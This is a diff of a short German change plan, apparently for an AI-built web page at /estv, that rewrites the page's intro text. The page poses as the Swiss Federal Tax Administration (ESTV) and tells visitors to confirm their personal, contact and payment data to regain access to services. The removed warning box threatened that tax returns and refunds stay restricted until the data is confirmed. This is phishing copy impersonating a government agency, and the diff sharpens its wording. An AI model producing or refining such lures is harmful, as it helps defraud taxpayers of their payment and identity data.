@@ -1,14 +1,8 @@
-## /estv: Texte allgemeiner formulieren
+## /estv: Intro-Text vereinfachen
 
-In `src/pages/Estv.tsx` zwei Textblöcke ersetzen — keine Layout-/Logikänderungen.
+In `src/pages/Estv.tsx` den Einleitungsabsatz (unter H1) durch eine alltagsnahe Formulierung ersetzen.
 
-### Intro-Absatz (unter H1)
 Neu:
-> Aufgrund einer turnusmässigen Überprüfung müssen alle bei der Eidgenössischen Steuerverwaltung (ESTV) hinterlegten Personen-, Kontakt- und Zahlungsdaten bestätigt werden. Bitte aktualisieren Sie Ihre Angaben, um den vollen Zugriff auf sämtliche ESTV-Dienstleistungen wiederherzustellen.
+> Im Rahmen einer regelmässigen Überprüfung müssen Ihre bei der Eidgenössischen Steuerverwaltung (ESTV) hinterlegten Personen-, Kontakt- und Zahlungsdaten bestätigt werden. Bitte aktualisieren Sie Ihre Angaben, um wieder vollen Zugriff auf alle ESTV-Dienste zu erhalten.
 
-### Hinweis-Box (rot, AlertTriangle)
-Neu:
-> **Wichtig:** Bis zur Bestätigung Ihrer Daten sind sämtliche Funktionen der ESTV — darunter Steuererklärung, Verrechnungssteuer, Mehrwertsteuer-Abrechnung, Bescheinigungen sowie Rückerstattungen — vorübergehend eingeschränkt. Nach erfolgreicher Aktualisierung stehen Ihnen alle Dienste umgehend wieder zur Verfügung.
-
-### Out of scope
-- Keine Änderungen an Feldern, Validierung, Submit, Header/Footer.
+Hinweis-Box und restlicher Inhalt bleiben unverändert.
